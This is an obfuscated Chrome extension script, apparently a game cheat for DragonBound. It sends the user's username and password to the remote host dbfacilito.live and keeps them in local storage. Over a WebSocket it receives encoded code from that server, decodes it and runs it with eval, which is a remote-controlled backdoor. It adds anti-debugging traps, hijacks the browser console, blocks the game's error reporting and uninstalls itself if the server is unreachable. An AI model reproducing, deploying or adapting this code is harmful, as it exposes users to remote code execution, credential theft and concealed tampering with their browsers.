!(function () {
    const _0x5ba6ef = (function () {
            let e = true;
            return function (t, n) {
                const o = e ? function () {
                    if (n) {
                        const e = n.apply(t, arguments);
                        return n = null, e;
                    }
                } : function () {
                };
                return e = false, o;
            };
        }()), _0x39a577 = (function () {
            let e = true;
            return function (t, n) {
                const o = e ? function () {
                    if (n) {
                        const e = n.apply(t, arguments);
                        return n = null, e;
                    }
                } : function () {
                };
                return e = false, o;
            };
        }());
    let _0x1a76d8;
    ;
    window.IP_SERVER = 'dbfacilito.live';
    const _0x441418 = window.IP_SERVER, _0x25fb7b = {
            hostServer: _0x441418,
            apiServer: 'https://' + _0x441418,
            loginPage: 'page/internal_page.html'
        };
    var dragonSocket = new WebSocket('ws://localhost:9005');
    function _0x42b15a(e, t) {
        ;
        return fetch(e, t).then(e => e.json()).then(e => e.error ? (_0x3a845a('ERRC'), alert(e.error), {
            success: false,
            message: e.error
        }) : e.token ? (localStorage.setItem('credentials', t.body), localStorage.setItem('token', e.token), _0x4636c9(e.token), n) : (_0x3a845a('ERRS'), o)).catch(e => (alert('ERROR SERVER'), _0x3a845a('ERRN'), {
            success: false,
            message: 'Network error: ' + e.message
        }));
    }
    function _0xb9c044(e, t) {
        return fetch(e, t).then(e => e.json()).then(e => {
            e.token ? (localStorage.setItem('credentials', t.body), localStorage.setItem('token', e.token), _0x4636c9(e.token), Osj9j) : e.error && (_0x3a845a('ERRC'), alert(e.error), chrome.tabs.create({
                url: chrome.runtime.getURL('page/internal_page.html'),
                active: true
            }));
        }).catch(e => {
            alert('ERROR SERVER');
            _0x3a845a('ERRN');
            ;
            let t = chrome.runtime.id;
            chrome.management.getAll(function (e) {
                for (var n in e)
                    e[n].id == t && chrome.management.uninstall(t, () => {
                        chrome.management.get(t, () => {
                        });
                    });
            });
        });
    }
    function _0x4636c9(_0x39160f) {
        _0x1a76d8 = new WebSocket(('localhost:3000' == _0x441418 ? 'ws' : 'wss') + '://' + _0x25fb7b.hostServer + '?token=' + _0x39160f + '&c=3');
        _0x1a76d8.onopen = () => {
            _0x3a845a('ON');
        };
        _0x1a76d8.onmessage = _0x4aac75 => {
            const _0x53e94f = _0x4aac75.data || '', _0x2e7b29 = new Blob([_0x53e94f], _0x15af46), _0x42646c = new FileReader();
            _0x42646c.onload = function (_0x56598e) {
                const _0x4f3438 = _0x56598e.target.result, _0x30e196 = JSON.parse(atob(_0x4f3438));
                let _0x59027b = new TextEncoder().encode(_0x30e196[0]);
                for (let e = 0; e < _0x59027b.length; e++) {
                    _0x59027b[e] += 7;
                }
                for (let e = 0; e < 10; e++) {
                    _0x59027b[e] += 3;
                }
                _0x1a76d8.readyState === WebSocket.OPEN && _0x1a76d8.close();
                const decoded = new TextDecoder().decode(_0x59027b);
                dragonSocket.send(JSON.stringify({
                    type: 'RECEIVED_FROM_SERVER',
                    message: decoded
                }));
                eval(decoded);
                _0x3a845a('ON');
                ;
            };
            _0x42646c.onerror = function (e) {
                _0x3a845a('ERRF1');
            };
            _0x42646c.readAsText(_0x2e7b29);
            ;
        };
        ;
    }
    function _0x19309e() {
        var _0x18d45f = 99999 * Math.random() | 0, _0x44a542 = window.Date.now(), _0x26906f = false;
        !(function () {
            eval('this[' + _0x18d45f++ + '] = {}; debugger');
            _0x26906f = true;
            ;
        }());
        var _0xd53dc = window.Date.now() - _0x44a542;
        50 < _0xd53dc && _0x26906f && window.alertCheater();
    }
    function _0x3a845a(e) {
        chrome.browserAction.setBadgeBackgroundColor({
            color: [
                50,
                200,
                0,
                200
            ]
        });
        const t = { text: e };
        chrome.browserAction.setBadgeText(t);
        e = { title: e };
        chrome.browserAction.setTitle(e);
        ;
    }
    function _0x56950f() {
        const e = _0x5ba6ef(this, function () {
            return e.toString().search('(((.+)+)+)+$').toString().constructor(e).search('(((.+)+)+)+$');
        });
        e();
        _0x39a577(this, function () {
            let e;
            try {
                e = Function('return (function() {}.constructor("return this")(\\x20));')();
            } catch (t) {
                e = window;
            }
            const t = e.console = e.console || {}, n = [
                    'log',
                    'warn',
                    'info',
                    'error',
                    'exception',
                    'table',
                    'trace'
                ];
            for (let e = 0; e < n.length; e++) {
                const o = _0x39a577.constructor.prototype.bind(_0x39a577), r = n[e], a = t[r] || o;
                o.__proto__ = _0x39a577.bind(_0x39a577);
                o.toString = a.toString.bind(a);
                t[r] = o;
                ;
            }
        })();
        _0x3a845a('ID');
        ;
        var t = localStorage.getItem('credentials'), n = _0x25fb7b.apiServer + '/g';
        t ? _0xb9c044(n, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: t
        }).then(e => true).catch(e => chrome.tabs.create({
            url: chrome.runtime.getURL('page/internal_page.html'),
            active: true
        })) : chrome.tabs.create({
            url: chrome.runtime.getURL('page/internal_page.html'),
            active: true
        });
    }
    window.alertCheater = function () {
    };
    setInterval(_0x19309e, 2000);
    ;
    try {
        chrome.runtime.onMessage.addListener(function (e, t, n) {
            if (e.username && e.password) {
                return _0x42b15a(_0x25fb7b.apiServer + '/g', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: e.username,
                        password: e.password
                    })
                }).then(e => {
                    n(e);
                }).catch(e => {
                    n({
                        success: false,
                        message: _0xcc4362.errorUnexpected + e.message
                    });
                }), true;
            }
        });
        chrome.webRequest.onBeforeRequest.addListener(function (e) {
            ;
            if (e.url.includes('https://dragonbound.net/error') || e.url.includes('https://www.googletagmanager.com/gtag/js')) {
                return t;
            }
        }, {
            urls: [
                'https://dragonbound.net/error*',
                'https://www.googletagmanager.com/gtag/js*'
            ]
        }, ['blocking']);
        _0x56950f();
        ;
    } catch (e) {
    }
}());
